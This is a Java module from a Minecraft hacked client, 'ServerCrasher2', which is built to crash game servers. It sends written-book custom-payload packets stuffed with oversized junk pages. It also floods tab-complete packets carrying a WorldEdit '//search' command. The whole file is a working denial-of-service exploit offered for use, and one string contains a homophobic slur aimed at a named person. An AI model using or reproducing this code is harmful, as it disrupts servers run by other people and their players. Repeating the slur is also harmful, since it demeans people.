package me.xatzdevelopments.xatz.client.modules;

import org.lwjgl.input.Keyboard;

import io.netty.buffer.Unpooled;
import me.xatzdevelopments.xatz.client.module.state.Category;
import me.xatzdevelopments.xatz.client.tools.Timer1;
import me.xatzdevelopments.xatz.client.tools.timer;
import me.xatzdevelopments.xatz.module.Module;
import net.minecraft.client.Minecraft;
import net.minecraft.client.network.NetHandlerPlayClient;
import net.minecraft.init.Items;
import net.minecraft.item.ItemStack;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import net.minecraft.network.Packet;
import net.minecraft.network.PacketBuffer;
import net.minecraft.network.play.client.C14PacketTabComplete;
import net.minecraft.network.play.client.C17PacketCustomPayload;
import net.minecraft.util.BlockPos;

public class ServerCrasher2 extends Module {

	public ServerCrasher2() {
		super("ServerCrasher2", Keyboard.KEY_NONE, Category.EXPLOITS, "Crashes servers!");
	}

	@Override
	public void onDisable() {

		super.onDisable();
	}

	@Override
	public void onEnable() {
		
		super.onEnable();
	}

	@Override
	public void onUpdate() {
		timer t = new timer();
		
	if (currentMode.equals("Book")){
		if (t.delay(1)) {
			
			Test();
		        Test();
		        
		       }
		
		
			
	}
	if (currentMode.equals("Packet")){
		Timer1 timer = new Timer1();
		if(timer.hasReached(240)) {
		  mc.thePlayer.sendQueue.addToSendQueue(new C14PacketTabComplete("//search d" + (int)(Math.random() * 1000.0), new BlockPos(0, 0, 0)));
   timer.reset();
		}
	}

		super.onUpdate();
	}
	public static void sendPacketSkipQueue(Packet p)
	  {
	    Minecraft.getMinecraft().getNetHandler().getNetworkManager().dispatchPacket(p, null);
	  }
	 public static void Test()
	  {
         NetHandlerPlayClient sendQueue = mc.thePlayer.sendQueue;
	    try
	    {
	      ItemStack bookObj = new ItemStack(Items.written_book);
	      String author = "GreatZardasht" + Math.random() * 400.0D;
	      String title = "Marshy client=skid" + Math.random() * 400.0D;
	      String mm255 = "Marshyisgaywveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5vr2c43rc434v432tvt4tvybn4n6n57u6u57m6m6678mi68,867,79o,o97o,978iun7yb65453v4tyv34t4t3c2cc423rc334tcvtvt43tv45tvt5t5v43tv5345tv43tv5355vt5t3tv5t533v5t45tv43vt4355t54fwveb54yn4y6y6hy6hb54yb5436by5346y3b4yb343yb453by45b34y5by34yb543yb54y5 h3y4h97,i567yb64t5";
	      NBTTagCompound tag = new NBTTagCompound();
	      NBTTagList list = new NBTTagList();
	      for (int i = 0; i < 50; i++)
	      {
	    	  String siteContent = mm255;
	          NBTTagString tString = new NBTTagString(siteContent);
	          list.appendTag(tString);
	          
	        }
	      tag.setString("author", author);
	      tag.setString("title", title);
	      tag.setTag("pages", list);
	      if (bookObj.hasTagCompound())
	      {
	        NBTTagCompound nbttagcompound = bookObj.getTagCompound();
	        nbttagcompound.setTag("pages", list);
	      }
	      else
	      {
	        bookObj.setTagInfo("pages", list);
	      }
	      String s2 = "MC|BEdit";
	      if (Module.rand.nextBoolean()) {
	        s2 = "MC|BSign";
	      }
	      bookObj.setTagCompound(tag);
	      PacketBuffer packetbuffer = new PacketBuffer(Unpooled.buffer());
	      packetbuffer.writeItemStackToBuffer(bookObj);
	      sendPacket(new C17PacketCustomPayload(s2, packetbuffer));
	    }
	    catch (Exception localException) {}
	  }
	 @Override
		public String[] getModes() {
			return new String[] { "Book","Packet"};
		}
	 
	 public String getModeName() {
			return "Mode: ";
		}

		@Override
		public String getAddonText() {
			return currentMode;
		}
	  }
